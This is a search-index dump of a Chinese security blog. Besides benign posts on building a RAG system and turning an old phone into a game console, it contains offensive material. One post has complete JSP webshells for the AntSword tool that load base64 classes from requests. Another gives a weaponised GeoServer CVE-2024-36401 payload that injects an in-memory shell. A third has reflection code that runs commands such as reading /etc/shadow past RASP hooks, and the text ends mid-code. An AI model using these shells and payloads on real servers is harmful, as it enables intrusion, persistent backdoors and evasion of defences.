[{"categories":null,"content":" 博客托管在github上，经常打不开，手机端体验也不太好，所以搞了个公众号当移动端版本的博客，欢迎大家关注。有什么问题可以直接公众号留言给我。 ","date":"2022-03-07","objectID":"/posts/gzh/:0:0","series":null,"tags":[],"title":"[置顶] 搞了个公众号","uri":"/posts/gzh/#"},{"categories":null,"content":"\r","date":"2024-10-25","objectID":"/posts/llm-rag/:0:0","series":null,"tags":null,"title":"大模型应用之RAG技术学习","uri":"/posts/llm-rag/#"},{"categories":null,"content":"\r1 什么是RAG检索增强生成（Retrieval Augmented Generation, RAG）是一种技术，它通过从数据源中检索信息来辅助大语言模型（Large Language Model, LLM）生成答案。 简而言之，RAG 结合了搜索技术和大语言模型的提示词功能，即向模型提出问题，并以搜索算法找到的信息作为背景上下文，这些查询和检索到的上下文信息都会被整合进发送给大语言模型的提示中。 ","date":"2024-10-25","objectID":"/posts/llm-rag/:1:0","series":null,"tags":null,"title":"大模型应用之RAG技术学习","uri":"/posts/llm-rag/#什么是rag"},{"categories":null,"content":"\r1.1 为什么会出现RAG思考一个问题：为什么会出现RAG这一项技术？ 一般来说，想要给大模型输入指定的知识有两种办法：一种是在prompt时加入上下文，另一种是通过fine-tuning。 如果知识较少且较为固定的时候还好，但是当知识库非常大且需要频繁迭代的时候，这两种办法的局限性就更加突出了： 如果通过prompt，大模型是有token数量限制的。面对庞大的知识库，大模型不可能一下子读取所有内容。 如果通过微调，加一点知识就要微调一次，各方面成本很高。 因此RAG技术应运而生。 RAG是怎么解决这个问题的呢？ 简单来说，就是“外挂”一个向量数据库，每次查询之前在知识库中进行一次相似度检索，将较为精确的知识片段截取出来后，再拼接到prompt的上下文里作为背景知识。这样就同时解决了大模型token上限，以及知识库频繁迭代的问题。同时，通过prompt约束，还可以防止大模型幻觉的产生。 一个经典的图如下： 通常流程是： 文档向量化过程：文档-\u003e分词-\u003eembedding-\u003e向量数据库 用户查询过程：用户query-\u003e向量数据库查询-\u003eTOP N-\u003e上下文+ 用户提问 + prompt -\u003e LLM -\u003e 返回结果 这里涉及到几个关键名词：embedding、向量数据库、Retrieval ","date":"2024-10-25","objectID":"/posts/llm-rag/:1:1","series":null,"tags":null,"title":"大模型应用之RAG技术学习","uri":"/posts/llm-rag/#为什么会出现rag"},{"categories":null,"content":"\r1.2 embeddingembedding是将现实中的物体通过向量化的方法转化为高维向量，可被机器学习模型所识别。他是一种映射，同时也保证了能清晰地表达现实物体的特征。基于此，可以进行一些归类分析、回归分析等。 ","date":"2024-10-25","objectID":"/posts/llm-rag/:1:2","series":null,"tags":null,"title":"大模型应用之RAG技术学习","uri":"/posts/llm-rag/#embedding"},{"categories":null,"content":"\r1.3 向量数据库向量数据库底层存储的是一堆向量，它提供了根据向量相似度进行查询的能力，一般情况下，向量相似度代表了现实世界中物体的相似度。比如”我的名字是小明“ 和“我叫小明”这两句话所代表的含义几乎是相同的，那么在embedding之后，基于向量数据库进行查询的时候，它们俩的相似度就会很近 ","date":"2024-10-25","objectID":"/posts/llm-rag/:1:3","series":null,"tags":null,"title":"大模型应用之RAG技术学习","uri":"/posts/llm-rag/#向量数据库"},{"categories":null,"content":"\r1.4 Retrieval文档检索（Retrieval）是信息检索领域中的一个关键任务，旨在从大量文档中找到与查询最相关的文档。根据具体使用的技术和方法，检索模式（Retrieval Mode）通常可以分为以下几种： Embedding Only Embedding Only 模式使用向量嵌入（vector embeddings）来表示文档和查询。向量嵌入是一种将高维数据映射到低维连续向量空间的技术，以便进行更高效的计算和比较。常见的Embedding技术包括Word2Vec、GloVe、BERT等。 工作方式: 将查询和文档都转换成向量嵌入，通过计算它们之间的距离（如余弦相似度）来进行匹配。 优点: 能捕捉到单词和短语之间的语义相似度，处理同义词和多义词效果较好。 缺点: 对于未在训练集中见过的新单词可能表现较差，且计算嵌入向量可能需要较高的计算资源。 Keyword Only Keyword Only 模式基于关键词匹配来进行文档检索。这种方法通常依赖于布尔检索模型或TF-IDF（Term Frequency-Inverse Document Frequency）等统计方法。 工作方式: 将查询和文档转换为关键词集合，基于这些关键词进行匹配和排序。 优点: 实现简单，计算效率高，适用于精确匹配的场景。 缺点: 无法处理同义词和语义相似度，可能会错过语义相关但不包含指定关键词的文档。 Hybrid Hybrid 模式结合了Embedding Only和Keyword Only两种方法，以便在检索过程中利用双方的优势。 工作方式: 先使用Keyword Only方法进行初步过滤，然后再用Embedding Only方法进行精细排序，或者同时使用两种方法并融合它们的结果。 优点: 在保证计算效率的同时，提高了语义理解的能力，能够更好地处理复杂查询。 缺点: 实现复杂度较高，可能需要更多的计算资源和时间。 ","date":"2024-10-25","objectID":"/posts/llm-rag/:1:4","series":null,"tags":null,"title":"大模型应用之RAG技术学习","uri":"/posts/llm-rag/#retrieval"},{"categories":null,"content":"\r2 搭建过程这里采用了手工编写代码搭建，以及使用阿里云人工智能PAI平台搭建两种方式。 ","date":"2024-10-25","objectID":"/posts/llm-rag/:2:0","series":null,"tags":null,"title":"大模型应用之RAG技术学习","uri":"/posts/llm-rag/#搭建过程"},{"categories":null,"content":"\r2.1 自动搭建商业化带来便利，提供婴儿级的一键式搭建服务。 阿里云的PAI平台支持一键部署大模型RAG对话系统，一行代码都不用写。 官方文档：https://help.aliyun.com/zh/pai/user-guide/deploy-a-rag-based-dialogue-system#2d416a8753chr 首先选择要使用哪个大模型。由于只是测试，选一个7b的Qwen2就够了。越大的模型需要越大的GPU，成本++ 另外还有一个向量数据库的选择，其他类型数据库都需要单独开通服务。FAISS可以直接存储在内存或者磁盘上，对我们测试来说基本够用了，比较方便。 点击部署之后等一会就可以看到Web控制台了 Setting里基本不用修改已经配好，我们只需要上传我们的知识库文件。 在这里我搜集了一些阿里云云安全中心的公开文档，以及加了一条我个人的说明。 传完之后，会进行向量化的操作，接着就可以开始提问了。 问一些数据库中有的知识 问一些没有的知识，会进行拒答。 通过左边的prompt模板，可以设置拒答的内容 左边的选项，还可以仅开启数据库检索，或者仅开启大模型功能 选择仅调用大模型的时候就不再受知识库的约束了，这里回答的是模型自身拥有的知识。 ","date":"2024-10-25","objectID":"/posts/llm-rag/:2:1","series":null,"tags":null,"title":"大模型应用之RAG技术学习","uri":"/posts/llm-rag/#自动搭建"},{"categories":null,"content":"\r2.2 手动搭建由于langchain这个工具库的存在，我们可以很方便地通过代码手动搭建RAG。 直接搜索出来的demo样例，都是基于openai的。但是众所周知，由于一些神秘魔法的存在，国内无法直接访问chatgpt跟huggingface，需要做本土化兼容。 因此我用Tongyi来代替Openai，另外给huggingface设置镜像。注意os.environ得在import huggingface库相关语句之前执行。 import os os.environ['HF_ENDPOINT'] = 'https://hf-mirror.com' 完整代码如下： import os os.environ['HF_ENDPOINT'] = 'https://hf-mirror.com' from langchain.embeddings import HuggingFaceEmbeddings from langchain.text_splitter import CharacterTextSplitter from langchain.vectorstores import FAISS from langchain.document_loaders import TextLoader from langchain.chains import RetrievalQA from langchain.llms import Tongyi # 设置环境变量 os.environ[\"DASHSCOPE_API_KEY\"] = \"xxxxx\" # 初始化文本嵌入模型 embeddings = HuggingFaceEmbeddings(model_name=\"sentence-transformers/paraphrase-multilingual-mpnet-base-v2\") # 加载文档 loader = TextLoader(\"知识库路径\") documents = loader.load() # 分割文本 text_splitter = CharacterTextSplitter(chunk_size=500, chunk_overlap=0) texts = text_splitter.split_documents(documents) # 创建向量存储 vectorstore = FAISS.from_documents(texts, embeddings) # 初始化通义千问模型 llm = Tongyi(model=\"qwen-turbo\") # 创建检索问答链 qa_chain = RetrievalQA.from_chain_type( llm=llm, chain_type=\"stuff\", retriever=vectorstore.as_retriever(), return_source_documents=True ) # 使用函数进行问答 def ask_question(question): result = qa_chain({\"query\": question}) return result[\"result\"], result[\"source_documents\"] # 示例使用 question = \"云安全中心有什么功能？\" answer, sources = ask_question(question) print(f\"问题: {question}\") print(f\"答案: {answer}\") # print(\"\\n来源文档:\") # for i, doc in enumerate(sources): # print(f\"文档 {i+1}:\") # print(doc.page_content) # print(\"-\" * 50) 至于参数的选择，embedding模型就找一个下载量高的，Claude给我推荐的是sentence-transformers/paraphrase-multilingual-mpnet-base-v2 chain_type如果没有特殊要求，或者特殊场景一般默认的Stuff就够用了。其他的几个类型定义以及对比如下： 好了，上面的代码不出意外，是可以直接运行的 不过还是出了点意外，自己本地跑的时候一直有一个报错 debug看一下，发现提示 Workspace.AccessDenied 后来发现应该是通义的API迭代了，之前申请的key是没有业务空间的概念的，虽然有效但是没办法使用。 重新申请了一个解决 开始提问：云安全中心有什么功能 谁是yzddmr6 问一个不在知识库里的问题：谁是yzddmr7。虽然没有找到，但是进行了相似的推荐。 接着一个不在知识库里的问题：介绍一下腾讯公司 可以看到，虽然大模型回答没有找到腾讯公司的信息，但是还是以另外一种方式介绍了腾讯公司。这肯定是不符合预期的。 我们可以通过修改prompt来进行约束，禁止大模型回答知识库以外的内容。 你是一个只基于检索到的信息回答问题的ai助手，这里是对你的要求： 1,请仔细分析提供的上下文信息，并只使用其中包含的事实来回答问题。 2.如果问题无法完全用检索到的信息回答，请说明你无法回答该问题或该问题的某些部分。 3.不要编造，推测或添加任何未在检索结果中明确提供的信息。 这样大模型就不会再回答知识库以外的内容了。 ","date":"2024-10-25","objectID":"/posts/llm-rag/:2:2","series":null,"tags":null,"title":"大模型应用之RAG技术学习","uri":"/posts/llm-rag/#手动搭建"},{"categories":null,"content":"\r1 背景最近给AntSword新增了一种类型：JSPRAW，主要有以下两点改进： JSPRAW不再使用其他参数进行传参，同时支持key-value键值对以及raw传参形式 新增toString触发方式，Payload可以不用依赖外部request/response对象，兼容非HTTP场景 接下来以几个实际场景讲讲这个新类型有哪些应用。 ","date":"2024-09-22","objectID":"/posts/antsword-jspraw/:1:0","series":null,"tags":null,"title":"AntSword新增类型：JSPRAW的一些玩法","uri":"/posts/antsword-jspraw/#背景"},{"categories":null,"content":"\r2 具体应用","date":"2024-09-22","objectID":"/posts/antsword-jspraw/:2:0","series":null,"tags":null,"title":"AntSword新增类型：JSPRAW的一些玩法","uri":"/posts/antsword-jspraw/#具体应用"},{"categories":null,"content":"\r2.1 一键连接冰蝎的JSP ShellJSPRAW支持如下Shell写法，类似冰蝎，直接发送RAW格式的Payload。需要注意的是这时候设置密码是不生效的，随便填即可，另外需要在设置里勾选 其他设置-Body设置为RAW模式。如果不勾选的话就是键值对传参形式，可以兼容原来的Shell写法。 \u003c%! class U extends ClassLoader { U(ClassLoader c) { super(c); } public Class g(byte[] b) { return super.defineClass(b, 0, b.length); } } public byte[] base64Decode(String str) throws Exception { try { Class clazz = Class.forName(\"sun.misc.BASE64Decoder\"); return (byte[]) clazz.getMethod(\"decodeBuffer\", String.class).invoke(clazz.newInstance(), str); } catch (Exception e) { Class clazz = Class.forName(\"java.util.Base64\"); Object decoder = clazz.getMethod(\"getDecoder\").invoke(null); return (byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, str); } } %\u003e \u003c% String cls = request.getReader().readLine(); if (cls != null) { new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(new Object[]{request,response}); } %\u003e 此时传递的Payload形式如下 既然已经是冰蝎的传参形式了，那么我们只要配合特定的编码器，就可以直接连接冰蝎的Shell了 设置里需要勾选 Body设置为RAW模式 正常连接 抓包可以看到，蚁剑也同样实现了冰蝎的强加密能力。一个Shell，两种用法。 可以再单独写一个解码器对回显包进行二次编码，这里就不再展开 ","date":"2024-09-22","objectID":"/posts/antsword-jspraw/:2:1","series":null,"tags":null,"title":"AntSword新增类型：JSPRAW的一些玩法","uri":"/posts/antsword-jspraw/#一键连接冰蝎的jsp-shell"},{"categories":null,"content":"\r2.2 兼容非HTTP场景在实战中我们会遇到一些非HTTP的情况，例如WebSocket内存马，WebFlux内存马，表达式注入等。因此JSPRAW做了一些改进，以兼容这类利用场景。 在Payload中增加了一个toString的调用入口，可以把执行的回显信息保存到一个字符串里并且return 只调用toString的Shell样例如下： \u003c%! class U extends ClassLoader { U(ClassLoader c) { super(c); } public Class g(byte[] b) { return super.defineClass(b, 0, b.length); } } public byte[] base64Decode(String str) throws Exception { try { Class clazz = Class.forName(\"sun.misc.BASE64Decoder\"); return (byte[]) clazz.getMethod(\"decodeBuffer\", String.class).invoke(clazz.newInstance(), str); } catch (Exception e) { Class clazz = Class.forName(\"java.util.Base64\"); Object decoder = clazz.getMethod(\"getDecoder\").invoke(null); return (byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, str); } } %\u003e \u003c% String cls = request.getReader().readLine(); if (cls != null) { out.print(new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance()); } %\u003e 正常连接 并且equals跟toString可以同时使用，equals拿到request对象后，还可以同时通过toString获取回显。 这样的写法主要是可以兼容一些漏洞利用场景，不需要每次额外去做判断。不理解的小伙伴多写几个利用EXP就明白我什么意思了。 \u003c%! class U extends ClassLoader { U(ClassLoader c) { super(c); } public Class g(byte[] b) { return super.defineClass(b, 0, b.length); } } public byte[] base64Decode(String str) throws Exception { try { Class clazz = Class.forName(\"sun.misc.BASE64Decoder\"); return (byte[]) clazz.getMethod(\"decodeBuffer\", String.class).invoke(clazz.newInstance(), str); } catch (Exception e) { Class clazz = Class.forName(\"java.util.Base64\"); Object decoder = clazz.getMethod(\"getDecoder\").invoke(null); return (byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, str); } } %\u003e \u003c% String cls = request.getReader().readLine(); if (cls != null) { Object obj = new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance(); obj.equals(new Object[]{request,response}); out.print(obj.toString()); } %\u003e 正常连接 ","date":"2024-09-22","objectID":"/posts/antsword-jspraw/:2:2","series":null,"tags":null,"title":"AntSword新增类型：JSPRAW的一些玩法","uri":"/posts/antsword-jspraw/#兼容非http场景"},{"categories":null,"content":"\r2.3 高版本JDK下的WebSocket内存马这里举一个例子：高版本JDK下如何连接WebSocket内存马 背景是蚁剑很早就支持了WebSocket类型的内存马，在JDK\u003c=14的时候可以用Js引擎来实现WebSocket内存马的连接Payload，但是从JDK15开始Js引擎被移除，就无法再使用了。 现在有了JSPRAW之后，WebSocket内存马就不存在高版本JDK的兼容性问题了，可以一直支持到最新的JDK22。 测试的时候还遇到了一个小坑，注入WS内存马以后连接发现只能执行第一个包，后面的包都没有回复。 debug了一番发现原因是Tomcat中WebSocke 发送信息默认长度为8kb，而后续的Payload超过了这个大小。 正常的做法是修改web.xml调大这个参数 \u003ccontext-param\u003e \u003cparam-name\u003eorg.apache.tomcat.websocket.textBufferSize\u003c/param-name\u003e \u003cparam-value\u003e5242800\u003c/param-value\u003e \u003c/context-param\u003e 当然我们不可能去修改web.xml了，代码里找一下在哪里调用的，修改掉就好了 ServerContainer container = (ServerContainer) servletContext.getAttribute(ServerContainer.class.getName()); container.setDefaultMaxTextMessageBufferSize(52428800); // 设置为50m container.setDefaultMaxBinaryMessageBufferSize(52428800); 这样就可以正常连接了 ","date":"2024-09-22","objectID":"/posts/antsword-jspraw/:2:3","series":null,"tags":null,"title":"AntSword新增类型：JSPRAW的一些玩法","uri":"/posts/antsword-jspraw/#高版本jdk下的websocket内存马"},{"categories":null,"content":"\r3 最后代码已经同步到github：https://github.com/AntSwordProject/AntSword-JSP-Template/tree/jspraw 实战是检验真理的唯一标准，你还有什么建议或者新的玩法呢？欢迎一起讨论:) ","date":"2024-09-22","objectID":"/posts/antsword-jspraw/:3:0","series":null,"tags":null,"title":"AntSword新增类型：JSPRAW的一些玩法","uri":"/posts/antsword-jspraw/#最后"},{"categories":null,"content":"\r1 背景GeoServer 是 OpenGIS Web 服务器规范的 J2EE 实现，利用 GeoServer 可以方便的发布地图数据，允许用户对特征数据进行更新、删除、插入操作。 在GeoServer 2.25.1， 2.24.3， 2.23.5版本及以前，未登录的任意用户可以通过构造恶意OGC请求，在默认安装的服务器中执行XPath表达式，进而利用执行Apache Commons Jxpath提供的功能执行任意代码。 from https://github.com/vulhub/vulhub/blob/master/geoserver/CVE-2024-36401/ 本文主要研究如何武器化利用，注入内存马。 ","date":"2024-07-04","objectID":"/posts/geoserver-memoryshell/:1:0","series":null,"tags":null,"title":"GeoServer property RCE注入内存马","uri":"/posts/geoserver-memoryshell/#背景"},{"categories":null,"content":"\r2 注入内存马目前市面上公开的POC主要是做到了命令执行： exec(java.lang.Runtime.getRuntime(),'touch /tmp/success2') Apache XPath解析表达式是支持链式调用的，是非常常见的一个表达式注入场景。虽然也可以用ClassPathXmlApplicationContext或者JNDI这种远程加载的方式去加载类，但是总归是有限制，不优雅。可以参考我之前在Kcon上讲过的议题《Java表达式攻防下的黑魔法》，可以利用Js引擎将这类链式调用的命令执行转化为完全体的任意代码执行，并且无需出网，无需额外依赖 Y4tacker也在之前的文章中提到了怎么构造Js引擎的Poc：https://tttang.com/archive/1771/ eval(getEngineByName(javax.script.ScriptEngineManager.new(),'js'),'java.lang.Runtime.getRuntime().exec(\"open -na Calculator\")') 那么似乎我们只需要把Js执行的Payload换成我之前议题中给出的Payload即可： https://github.com/yzddmr6/Java-Js-Engine-Payloads 但是实际上实现的时候有两个坑 ","date":"2024-07-04","objectID":"/posts/geoserver-memoryshell/:2:0","series":null,"tags":null,"title":"GeoServer property RCE注入内存马","uri":"/posts/geoserver-memoryshell/#注入内存马"},{"categories":null,"content":"\r2.1 无法使用函数首先利用JMG生成内存马注入代码。由于通过bin形式安装默认是Jetty，这里选择Jetty类型 然后将code部分替换 function Base64DecodeToByte(str) { var bt; try { bt = java.lang.Class.forName(\"sun.misc.BASE64Decoder\").newInstance().decodeBuffer(str); } catch (e) { bt = java.util.Base64.getDecoder().decode(str); } return bt; } function defineClass(classBytes) { var theUnsafe = java.lang.Class.forName(\"sun.misc.Unsafe\").getDeclaredField(\"theUnsafe\"); theUnsafe.setAccessible(true); unsafe = theUnsafe.get(null); unsafe.defineAnonymousClass(java.lang.Class.forName(\"java.lang.Class\"), classBytes, null).newInstance(); } defineClass(Base64DecodeToByte(code)); 打这个漏洞如果返回java.lang.ClassCastException是正常的，但是出现了下面的报错，说明有问题了。 经过多次测试，发现这里的Payload不能用function的语法。十分神秘，单独测试Js引擎没有这个问题，暂时没有去深入研究原因。 ","date":"2024-07-04","objectID":"/posts/geoserver-memoryshell/:2:1","series":null,"tags":null,"title":"GeoServer property RCE注入内存马","uri":"/posts/geoserver-memoryshell/#无法使用函数"},{"categories":null,"content":"\r2.2 JDK11下的defineAnonymousClass重新改成不带function的形式，又出现了另外一个报错 发现原因是JDK\u003e8时，defineAnonymousClass做了限制，被加载的Class要满足两个条件之一： 没有包名 包名跟第一个参数Class的包名一致，此处为java.lang，否则会报错 而JDK8及以下无此限制 正好JMG提供了修改注入器类名的功能，这里我们随便起一个java.lang.test的名字 终于不报错了，注入成功 连接的时候发现JMG的Jetty-AntSword-Listener类型似乎有BUG，打进去连接不上 随后换成Filter连接成功 注入内存马Payload \u003cwfs:GetPropertyValue service='WFS' version='2.0.0' xmlns:topp='http://www.openplans.org/topp' xmlns:fes='http://www.opengis.net/fes/2.0' xmlns:wfs='http://www.opengis.net/wfs/2.0'\u003e \u003cwfs:Query typeNames='sf:archsites'/\u003e \u003cwfs:valueReference\u003eeval(getEngineByName(javax.script.ScriptEngineManager.new(),'js'),' var str=\"\"; var bt; try { bt = java.lang.Class.forName(\"sun.misc.BASE64Decoder\").newInstance().decodeBuffer(str); } catch (e) { bt = java.util.Base64.getDecoder().decode(str); } var theUnsafe = java.lang.Class.forName(\"sun.misc.Unsafe\").getDeclaredField(\"theUnsafe\"); theUnsafe.setAccessible(true); unsafe = theUnsafe.get(null); unsafe.defineAnonymousClass(java.lang.Class.forName(\"java.lang.Class\"), bt, null).newInstance(); ')\u003c/wfs:valueReference\u003e \u003c/wfs:GetPropertyValue\u003e ","date":"2024-07-04","objectID":"/posts/geoserver-memoryshell/:2:2","series":null,"tags":null,"title":"GeoServer property RCE注入内存马","uri":"/posts/geoserver-memoryshell/#jdk11下的defineanonymousclass"},{"categories":null,"content":"\r","date":"2024-01-21","objectID":"/posts/old-phone-for-game/:0:0","series":null,"tags":null,"title":"旧手机改造游戏机","uri":"/posts/old-phone-for-game/#"},{"categories":null,"content":"\r1 背景最近安卓yuzu模拟器突飞猛进，能玩的游戏越来越多，画质也越来越好。 家里正好有一个吃灰的小米10，865，8+128，属于yuzu跟开源驱动优化的还比较好的型号。就准备把它改造成一个游戏机，发挥一下余热。 ","date":"2024-01-21","objectID":"/posts/old-phone-for-game/:1:0","series":null,"tags":null,"title":"旧手机改造游戏机","uri":"/posts/old-phone-for-game/#背景"},{"categories":null,"content":"\r2 刷系统MIUI是不可能MIUI的，太臃肿了。最开始小米10刷的EvolutionX，但是更新了最后一个版本之后掉电嘎嘎快。待机的情况下一天掉20的电，压都压不住，作为游戏机肯定是不行的，还没开始玩就没电了，需要重新换个系统。 找了一圈支持小米10的类原生，综合对比决定刷tequilaos.org这个ROM，不那么臃肿，也不像lineageOS那么毛坯。使用一段下来感觉不错，配合冻它待机一天也就掉4-5格电，电池健康度本来也不行了也可以理解。 这里还有一个插曲，发现tequilaos的内核不支持zstd等zram方式，就重新build了一个白狼内核刷进去，毕竟8G的内存比较紧张，zram肯定是要拉满的。 ","date":"2024-01-21","objectID":"/posts/old-phone-for-game/:2:0","series":null,"tags":null,"title":"旧手机改造游戏机","uri":"/posts/old-phone-for-game/#刷系统"},{"categories":null,"content":"\r3 Root与软件作为游戏机，其他没用的能不装就不装，尽量追求精简。类原生压后台的能力都不太行，避免安装国产流氓3A大作。下面是我装的一些常用软件： Scene：必装软件，性能调度/功耗监控等。 爱玩机工具箱：很多功能很方便。 MT管理器：安卓下无可替代的一款文件管理器，支持APK反编译等，功能强大。 冻它：支持图形化，日志也清晰能体现出电量变化，个人比较喜欢。 konabess：GPU超频/降压调节软件。 酷安：主要功能是装软件以及抄作业。 yuzu：开源Switch模拟器。 Shooting Plus：手柄映射软件。 ","date":"2024-01-21","objectID":"/posts/old-phone-for-game/:3:0","series":null,"tags":null,"title":"旧手机改造游戏机","uri":"/posts/old-phone-for-game/#root与软件"},{"categories":null,"content":"\r4 降压超频865还是有点东西，超频到905mhz一点问题没有，但是电压就得上turbo了，turbo耗电实在太快了。 经过多次测试，把最大频率调为855，电压NOM_L1，这样功耗跟性能都比较均衡。 超频之后跑一下分还行，比原来好多了，原来是4k左右。 ","date":"2024-01-21","objectID":"/posts/old-phone-for-game/:4:0","series":null,"tags":null,"title":"旧手机改造游戏机","uri":"/posts/old-phone-for-game/#降压超频"},{"categories":null,"content":"\r5 D8手柄键位调换主要是当Switch模拟器来用，直接搓玻璃差点意思，还是要选一个手柄。综合对比下来D8算是性价比非常高的一款手柄，100出头有霍尔摇杆，支持自定义映射以及宏功能。 但是美中不足的是D8是Xbox手柄格式，abxy的位置跟Switch的是相反的，这就导致非常的别扭。另外yuzu的映射非常的奇怪，xy的实际功能是相反的：按下x实际上对应的是y，y对应的是x，不行，得改造一下。 首先是调换abxy的位置，Xbox强改Switch键位，拆就完事了。 一番操作之后，好消息是键位换过来了，也能用；坏消息是怎么多了个零件出来？？？ ","date":"2024-01-21","objectID":"/posts/old-phone-for-game/:5:0","series":null,"tags":null,"title":"旧手机改造游戏机","uri":"/posts/old-phone-for-game/#d8手柄键位调换"},{"categories":null,"content":"\r6 逆向yuzu修改映射换过来之后，看起来是舒服了，但是现在又变成ab键是相反的了：a-\u003eb，b-\u003ea。 安卓yuzu目前还没有按键映射功能，为了解决映射的问题，尝试了好几个方法： yuzu+。B站上有大佬给yuzu添加上了按键映射的功能，但是很久没merge主线的更新。试了一下很多游戏还打不开/黑屏，放弃。 Shooting Plus。这是D8自带的一款映射软件，简单来说就是可以把手柄的按键模拟为屏幕的触摸，这样就可以用手柄玩王者荣耀原神这类原本不支持手柄的游戏。本来这是一个通用而且完美的方法，但是发现居然无法映射- +这两个按键。。。导致有些游戏里面打不开目录/设置等功能，遂放弃。 逆向yuzu。yuzu代码开源，翻了下源码控制映射的代码在这里：https://github.com/yuzu-emu/yuzu-android/blob/master/src/android/app/src/main/java/org/yuzu/yuzu_emu/utils/InputHandler.kt。其实可以修改源码后编译，但是里面有很多JNI库需要编译比较麻烦。反正也没加壳啥的，直接逆向修改后重新打包。过程可以直接看B站上大佬的：https://www.bilibili.com/read/cv28837309/，改成如下内容然后重新打包签名。这里还有一个问题，如果不卸载原来的yuzu会报签名不一致无法安装，lsposed安装核心破解绕过签名即可。 ","date":"2024-01-21","objectID":"/posts/old-phone-for-game/:6:0","series":null,"tags":null,"title":"旧手机改造游戏机","uri":"/posts/old-phone-for-game/#逆向yuzu修改映射"},{"categories":null,"content":"\r7 效果终于，一个比较理想的游戏机诞生了，玩玩马里奥或者塞尔达无双这类游戏还是没问题的，旧手机不用再换菜刀换剪子了。 不过模拟器还是图一乐，实际游戏体验并不是非常好，经常会闪退黑屏，导致塞尔达无双这种中途不能存档的游戏打了半天白打了。改造主要是享受折腾的乐趣，有能力的话还是支持一下正版。 ","date":"2024-01-21","objectID":"/posts/old-phone-for-game/:7:0","series":null,"tags":null,"title":"旧手机改造游戏机","uri":"/posts/old-phone-for-game/#效果"},{"categories":null,"content":"\r","date":"2023-12-28","objectID":"/posts/rasp-nativemethodprefix-bypass/:0:0","series":null,"tags":null,"title":"Bypass RASP NativeMethodPrefix学习","uri":"/posts/rasp-nativemethodprefix-bypass/#"},{"categories":null,"content":"\r1 背景众所周知，Java的RASP是没有办法直接Hook Native方法的，但确实有这个场景的需求。于是JDK官方出了一个java.lang.instrument.Instrumentation#setNativeMethodPrefix，在Java方法映射C++方法的时候加一个前缀，这样相当于创建一个了原有Native方法的代理，从而实现了Hook Native方法。 jrasp应该是最早公开介绍该技术用于RASP防御的（经su18师傅提醒，严谨一些）：https://www.jrasp.com/guide/technology/native_method.html。 但是当攻击者有一定代码执行权限的时候，还是可以绕过。以命令执行来说，原来的Native方法为forkAndExec，加个前缀变成prefix_forkAndExec，那么我们只需要反射调用prefix_forkAndExec这个新的方法名即可。 turn1tup师傅给出了一个绕过的demo，核心逻辑为通过反射拿到真正的native方法，即可绕过RASP对于命令执行的hook: https://github.com/turn1tup/JvmRaspBypass/blob/main/src/main/java/com/test/RaspExample.java try { Class\u003c?\u003e clazz = Class.forName(\"java.lang.UNIXProcess\"); //cmd2,bypass jrasp native hook for (Method m : clazz.getDeclaredMethods()) { if (m.getName().endsWith(\"forkAndExec\")\u0026\u0026!m.getName().equals(\"forkAndExec\")) { m.setAccessible(true); System.out.println(\"prefix native method : \"+m.getName()); Cmd.linuxCmd(new String[]{\"/bin/bash\",\"-c\",\"cat /etc/shadow \u0026\u0026 touch /tmp/shadow2\"},m); } } } catch (Exception ignore) { ignore.printStackTrace(); } 最近在实际攻防中发现该方式挺有用的，因此本人进行扩展，实现了一个Win/Linux下通用的，自动绕过MethodPrefix的，可回显的，反射Native方法执行命令的JSP Demo。 ","date":"2023-12-28","objectID":"/posts/rasp-nativemethodprefix-bypass/:1:0","series":null,"tags":null,"title":"Bypass RASP NativeMethodPrefix学习","uri":"/posts/rasp-nativemethodprefix-bypass/#背景"},{"categories":null,"content":"\r2 搞一个简单的RASP为了测试，先模拟一个setNativeMethodPrefix的RASP，参考 https://www.secrss.com/articles/49044，主要逻辑为： 1.移除想要hook的native方法。 2.增加一个native方法，这个方法和hook的native方法除了方法名增加prefix，其他相同。 3.增加一个和hook native方法同名的java方法（除了native modifier之外其他和hook native 方法相同），其中返回时调用prefix native方法。 这里为了简单起见直接throw Exception，把命令执行给干掉。 核心代码如下： public static byte[] transformed() { ClassPool pool = ClassPool.getDefault(); CtClass clazz = null; try { System.out.println(\"start convert java.lang.UNIXProcess\"); clazz = pool.getCtClass(\"java.lang.UNIXProcess\"); if (clazz.isFrozen()) { clazz.defrost(); } CtMethod method = CtNewMethod.make(\"int myPrefix_forkAndExec(int var1, byte[] var2, byte[] var3, byte[] var4, int var5, byte[] var6, int var7, byte[] var8, int[] var9, boolean var10);\", clazz); method.setModifiers(Modifier.PRIVATE | Modifier.NATIVE); System.out.println(\"add new native method myPrefix_forkAndExec\"); clazz.addMethod(method); CtMethod method1 = clazz.getDeclaredMethod(\"forkAndExec\"); System.out.println(\"remove old native method forkAndExec\"); clazz.removeMethod(method1); CtMethod method2 = CtNewMethod.make(\"int forkAndExec(int var1, byte[] var2, byte[] var3, byte[] var4, int var5, byte[] var6, int var7, byte[] var8, int[] var9, boolean var10) { throw new RuntimeException(\\\"RASP hooked forkAndExec\\\"); }\", clazz); System.out.println(\"add new method forkAndExec\"); clazz.addMethod(method2); return clazz.toBytecode(); } catch (Exception e) { e.printStackTrace(); } return new byte[0]; } 直接命令执行会被干掉 ","date":"2023-12-28","objectID":"/posts/rasp-nativemethodprefix-bypass/:2:0","series":null,"tags":null,"title":"Bypass RASP NativeMethodPrefix学习","uri":"/posts/rasp-nativemethodprefix-bypass/#搞一个简单的rasp"},{"categories":null,"content":"\r3 兼容无MethodPrefix场景\u0026添加回显把turn1tup师傅的代码改成JSP版本 可以绕过并执行命令，但是没回显，并且turn1tup师傅的代码仅适用于设置了MethodPrefix的场景，没设置反而不行。 javasec有一个Linux下反射Native执行命令并回显的demo，直接拿来改改 核心代码： try { Method forkMethod = processClass.getDeclaredMethod(\"forkAndExec\", new Class[]{ int.class, byte[].class, byte[].class, byte[].class, int.class, byte[].class, int.class, byte[].class, int[].class, boolean.class }); forkMethod.setAccessible(true);// 设置访问权限 int pid = (int) forkMethod.invoke(processObject, new Object[]{ ordinal + 1, helperpathObject, toCString(strs[0]), argBlock, args.length, null, envc[0], null, std_fds, false }); } catch (Exception e) { System.out.println(\"[-] reflect forkAndExec failed,try to bypass\"); for (Method m : processClass.getDeclaredMethods()) { if (m.getName().endsWith(\"forkAndExec\") 